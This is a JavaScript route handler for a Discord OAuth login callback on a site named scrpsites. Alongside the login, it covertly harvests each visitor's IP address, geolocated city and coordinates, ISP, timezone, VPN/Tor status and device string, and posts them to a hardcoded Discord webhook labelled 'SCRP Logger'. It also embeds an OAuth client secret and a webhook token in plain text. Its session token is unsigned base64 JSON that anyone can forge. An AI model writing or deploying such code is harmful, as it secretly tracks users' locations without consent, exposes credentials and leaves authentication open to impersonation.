export async function GET(req) {
  const { searchParams } = new URL(req.url)
  const code = searchParams.get("code")

  if (!code) {
    return Response.redirect("https://scrpsites.vercel.app/login?error=missing_code")
  }

  try {
    // Exchange code for token
    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        client_id: "1388702262829781093",
        client_secret: "oKdkh7KGFD2cckPy5XZR_--TzCw34Q_5",
        grant_type: "authorization_code",
        code,
        redirect_uri: "https://scrpsites.vercel.app/api/callback",
        scope: "identify",
      }),
    })

    const tokenData = await tokenRes.json()

    if (!tokenData.access_token) {
      console.error("Discord token error:", tokenData)
      return Response.redirect("https://scrpsites.vercel.app/login?error=token_failed")
    }

    // Get user info
    const userRes = await fetch("https://discord.com/api/users/@me", {
      headers: {
        Authorization: `Bearer ${tokenData.access_token}`,
      },
    })

    const user = await userRes.json()

    if (!user.id) {
      console.error("Discord user error:", user)
      return Response.redirect("https://scrpsites.vercel.app/login?error=user_failed")
    }

    // Build avatar URL
    const avatarURL = user.avatar
      ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
      : `https://cdn.discordapp.com/embed/avatars/${Number.parseInt(user.discriminator) % 5}.png`

    // Get real IP from headers
    const forwarded = req.headers.get("x-forwarded-for")
    const realIp = forwarded ? forwarded.split(",")[0] : "Unknown"

    // Get geolocation from ipwho.is
    let geoData = {}
    try {
      const geoRes = await fetch(`https://ipwho.is/${realIp}`)
      geoData = await geoRes.json()
    } catch (error) {
      console.error("Geo lookup failed:", error)
    }

    const city = geoData.city || "Unknown"
    const region = geoData.region || "Unknown"
    const country = geoData.country || "Unknown"
    const isp = geoData.connection?.isp || "Unknown"
    const timezone = geoData.timezone?.id || "Unknown"
    const countryCode = geoData.country_code?.toLowerCase() || "xx"
    const latitude = geoData.latitude || "Unknown"
    const longitude = geoData.longitude || "Unknown"
    const isProxy = geoData.proxy?.proxy || false
    const isHosting = geoData.proxy?.hosting || false
    const isVPN = geoData.proxy?.vpn || false
    const isTor = geoData.proxy?.tor || false

    // Get device/browser info
    const userAgent = req.headers.get("user-agent") || "Unknown"

    // Formatted local date/time
    const formattedTime = new Date().toLocaleString("en-US", {
      timeZone: "Asia/Manila",
      dateStyle: "long",
      timeStyle: "short",
    })

    // Send embed to webhook (don't let this fail the auth flow)
    try {
      await fetch(
        "https://discord.com/api/webhooks/1388707471228670062/k5Nwg7siYplB7EBFxk6AMH1qS08d6LoxAP4PMnaUuBZSw02G9iTht9F7eWJQmMfcUdNx",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [
              {
                title: "✅ New Discord Login",
                color: 16777215,
                thumbnail: {
                  url: avatarURL,
                },
                fields: [
                  { name: "👤 Username", value: `${user.username}#${user.discriminator}`, inline: true },
                  { name: "🆔 User ID", value: `${user.id}`, inline: true },
                  { name: "🌐 IP Address", value: realIp, inline: false },
                  { name: "📍 Location", value: `${city}, ${region}, ${country} :flag_${countryCode}:`, inline: false },
                  { name: "🛰️ ISP", value: isp, inline: true },
                  { name: "🕒 Timezone", value: timezone, inline: true },
                  { name: "🗺️ Coordinates", value: `Lat: ${latitude}\nLon: ${longitude}`, inline: false },
                  {
                    name: "🛡️ VPN / Proxy",
                    value: `VPN: ${isVPN ? "✅" : "❌"} | Proxy: ${isProxy ? "✅" : "❌"}\nHosting: ${isHosting ? "✅" : "❌"} | Tor: ${isTor ? "✅" : "❌"}`,
                    inline: false,
                  },
                  { name: "📅 Logged At", value: formattedTime, inline: false },
                  { name: "📱 Device Info", value: userAgent, inline: false },
                ],
                footer: {
                  text: "SCRP Logger",
                },
                timestamp: new Date().toISOString(),
              },
            ],
          }),
        },
      )
    } catch (webhookError) {
      console.error("Webhook failed:", webhookError)
      // Don't fail auth because of webhook issues
    }

    // Create authentication token (this is what the middleware expects)
    const authToken = Buffer.from(
      JSON.stringify({
        userId: user.id,
        username: user.username,
        discriminator: user.discriminator,
        avatar: user.avatar,
        loginTime: Date.now(),
      }),
    ).toString("base64")

    console.log("Creating auth token:", authToken.substring(0, 50) + "...")

    // Create response with redirect and set cookie
    const response = Response.redirect("https://scrpsites.vercel.app/")

    // Set the authentication cookie using Set-Cookie header
    response.headers.set(
      "Set-Cookie",
      `scrp-auth=${authToken}; HttpOnly; Secure; SameSite=Strict; Max-Age=${30 * 24 * 60 * 60}; Path=/`,
    )

    console.log("Auth cookie set, redirecting to main site")

    return response
  } catch (error) {
    console.error("OAuth callback error:", error)
    return Response.redirect("https://scrpsites.vercel.app/login?error=auth_failed")
  }
}
